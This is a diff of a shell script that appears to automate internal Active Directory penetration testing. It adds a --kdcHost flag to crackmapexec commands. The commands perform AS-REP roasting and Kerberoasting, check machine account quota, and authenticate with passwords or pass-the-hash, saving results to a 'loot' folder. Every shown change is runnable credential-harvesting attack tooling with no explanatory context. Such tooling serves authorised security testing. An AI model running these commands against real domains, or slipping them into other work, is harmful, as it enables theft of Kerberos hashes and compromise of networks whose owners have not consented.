@@ -113,17 +113,17 @@ then
   echo "ASRep" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # asreproast
-   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt --kdcHost $FQDN
 
   echo "Kerberoast" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # kerberoast
-   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt --kdcHost $FQDN
 
   echo "MAQ" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # MAQ  
-   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt --kdcHost $FQDN
 
   echo "LDAP Signing" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
@@ -192,17 +192,17 @@ echo 'HASH is untested'
   echo "ASRep" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # asreproast
-   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt --kdcHost $FQDN
 
   echo "Kerberoast" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # kerberoast
-   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt --kdcHost $FQDN
 
   echo "MAQ" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # MAQ  
-   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt --kdcHost $FQDN
 
   echo "LDAP Signing" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
